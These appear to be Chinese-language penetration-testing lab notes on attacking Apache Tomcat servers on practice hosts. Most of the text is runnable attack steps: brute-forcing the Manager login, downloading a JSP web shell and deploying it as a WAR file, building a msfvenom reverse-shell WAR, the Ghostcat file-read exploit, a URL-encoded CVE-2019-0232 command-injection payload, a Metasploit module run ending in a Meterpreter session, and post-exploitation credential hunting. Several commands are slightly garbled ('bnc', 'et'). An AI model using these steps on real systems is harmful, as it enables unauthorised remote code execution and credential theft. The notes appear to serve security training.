---
description: >-
  Apache Tomcat是一個開源 Web 伺服器，用於託管用 Java 編寫的應用程式。 Tomcat 最初設計用於執行 Java Servlets 和
  Java Server Pages (JSP) 腳本。然而，它在基於 Java 的框架中的流行度不斷提高，現在被 Spring 等框架和 Gradle
  等工具廣泛使用。根據BuiltWith收集的數據，目前有超過 22 萬個活躍的 Tomca
---

# Tomcat

## <mark style="color:red;">**1. 發現點**</mark>



#### 1️⃣ 確認 Tomcat 存在：

```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

結果會顯示：

```
Apache Tomcat 9 (9.0.30) - Documentation Index
```

> 確認係 Tomcat 9.0.30。

## <mark style="color:red;">**2. 測試Payload**</mark>

#### 使用 gobuster 嘗試發現管理界面、隱藏路徑

```bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

> 常見路徑有：`/manager/html`、`/host-manager/html`

## <mark style="color:red;">3. Tomcat Manager 爆破登入</mark>



```
[+] Username : b'tomcat'
[+] Password : b'admin'
```

成功後會回傳：

```bash
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

#### 方法 B：Python 自製暴力爆破腳本

```bash
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

成功後會回傳：

```
[+] Username : b'tomcat'
[+] Password : b'admin'
```

***

## <mark style="color:red;">4. Tomcat Manager WAR 檔案上傳取得 RCE</mark>

\
1️⃣ 製作 WAR 後門

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

#### 2️⃣ 登入 Tomcat 管理界面 (http://web01.inlanefreight.local:8180/manager/html)，上傳 `backup.war`

#### 3️⃣ 存取 shell：

```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

> 出現 `uid=1001(tomcat)` 即成功！

***

#### ⭐ 自動化反彈 shell（msfvenom 生成 war）

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=你的IP LPORT=4443 -f war > shell.war
```

然後上傳，之後用：

```bash
bnc -lvnp 4443
```

> 執行 `/shell/cmd.jsp` 後會收到反彈 shell。

***

## <mark style="color:red;">5.Ghostcat (</mark><mark style="color:orange;">CVE-2020-1938</mark><mark style="color:red;">) — AJP 協定 LFI 漏洞</mark>

1️⃣ 檢查 8009 埠

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

> 確認 `8009/tcp open ajp13`

2️⃣ 使用 Exploit (Python PoC)：

```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

> 如果成功會回傳 `web.xml` 檔案內容。

## <mark style="color:red;">6. 攻擊 Tomcat CGI</mark> <mark style="color:orange;">CVE-2019-0232</mark>

> \
> `CVE-2019-0232`是一個嚴重的安全問題，可能導致遠端執行程式碼。此漏洞影響啟用了`enableCmdLineArguments`功能的 Windows 系統。攻擊者可以透過利用 Tomcat CGI Servlet 輸入驗證錯誤導致的命令注入缺陷來利用此漏洞，從而允許他們在受影響的系統上執行任意命令。 Tomcat 的`9.0.0.M1`至`9.0.17`至`8.5.0`和`7.0.0`至`7.0.93` `8.5.39`均受到影響。

{% hint style="info" %}
CGI Servlet 是 Apache Tomcat 的重要元件，它使 Web 伺服器能夠與 Tomcat JVM 以外的外部應用程式進行通訊。這些外部應用程式通常是用 Perl、Python 或 Bash 等語言編寫的 CGI 腳本。 CGI Servlet 接收來自 Web 瀏覽器的請求並將其轉發給 CGI 腳本進行處理。
{% endhint %}

<details>

<summary>網站使用 CGI 腳本的原因有很多，但使用它們也有一些相當大的缺點：</summary>

| **優點**                     | **缺點**                       |
| -------------------------- | ---------------------------- |
| 它對於產生動態網頁內容來說簡單而有效。        | 由於必須為每個請求將程式載入到記憶體中，因此會產生開銷。 |
| 使用任何可以從標準輸入讀取並寫入標準輸出的程式語言。 | 在頁面請求之間無法輕鬆地在記憶體中快取資料。       |
| 可以重複使用現有程式碼並避免編寫新程式碼。      | 它降低了伺服器的效能並消耗了大量的處理時間。       |

</details>

{% stepper %}
{% step %}
### 列舉

```shell-session
nmap -p- -sC -Pn 10.129.204.227 --open 
```
{% endstep %}

{% step %}
**目錄與擴展名模糊測試 (Fuzzing)**

`.cmd`

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

`.bat`

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

➡️ 你成功發現有 `welcome.bat` 可以利用
{% endstep %}

{% step %}
### 開發 CVE-2019-0232(Tomcat CGI RCE)(方法一)

* 你測試直接執行失敗，Tomcat 報錯有非法字元
* 你成功找到繞過方法 → URL 編碼 `%3A`、`%5C`
* 這個漏洞是 Tomcat Windows 系統在執行 CGI script 時，可以透過 `&` 參數 + 絕對路徑執行任意程式。

成功測試 URL payload 應該如下：

```http
# http://10.129.204.227:8080/cgi/welcome.bat?&set
```

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

如果這樣成功，你會在頁面上回傳 `whoami` 執行結果
{% endstep %}

{% step %}
### **🚀 2. 測試 Metasploit(方法2)**

#### **📌 啟動 Metasploit 並設置攻擊模組**

```bash
msfconsole -q
use exploit/windows/http/tomcat_cgi_cmdlineargs
```

**此模組默認使用 `windows/meterpreter/reverse_tcp` 作為 payload。**

#### **📌 設置必要參數**

```bash
et RHOSTS 10.129.201.89
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
```

* `RHOSTS`：目標 IP (10.129.201.89)
* `TARGETURI`：Tomcat CGI 路徑 (`/cgi/cmd.bat`)
* `LHOST`：本地 VPN 介面 (`tun0`)
* `FORCEEXPLOIT`：強制執行漏洞利用 (`true`)

#### **📌 執行攻擊**

```bash
exploit
```

**成功建立 `Meterpreter` 連線**

```bash
[*] Meterpreter session 1 opened (10.10.14.45:4444 -> 10.129.201.89:49688)
```

***

### **🎯 3. 讀取 `flag.txt`**

```bash
cat C:/Users/Administrator/Desktop/flag.txt
```

💡 **成功獲取 Flag！**
{% endstep %}
{% endstepper %}



***

## <mark style="color:red;">7. 連鎖漏洞</mark>

| 漏洞點               | 行動                                                                   |
| ----------------- | -------------------------------------------------------------------- |
| 取得 Tomcat shell 後 | 嘗試使用 `sudo -l` 檢查提權，或利用 crontab 任務提權；或檢查 Tomcat 設定檔案是否洩露更多憑證。        |
| Ghostcat LFI      | 可用來讀取 Tomcat webapp 裏面的敏感配置檔案，可能有 hardcoded 密碼 / 數據庫憑證。              |
| Shell 提權          | 在 shell 裏面 `find / -perm -4000 -type f`、`sudo -l` 或試試 `pspy` 分析定時任務。 |
| 密碼回收              | `cat /opt/*`、`cat /var/lib/tomcat*/conf/*` 常見存有憑證或配置檔案。              |
| 內網掃描              | `netstat -anp`、`nmap -sP`、`arp -a` 尋找其他內網服務或橫向滲透機會。                  |
